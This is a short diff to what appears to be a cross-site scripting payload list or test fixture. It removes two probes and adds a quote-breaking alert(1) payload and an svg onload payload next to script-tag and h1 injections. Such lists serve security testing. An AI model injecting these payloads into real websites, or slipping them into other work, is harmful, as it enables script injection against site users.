@@ -1,5 +1,5 @@
 <track></track>
-'';!--"<XSS>=&{()}
-\";alert('XSS');//
+'";alert(1)//
 <script>alert(1)</script>
 <h1>XSS</h1>
+<svg/onload=alert(1)>
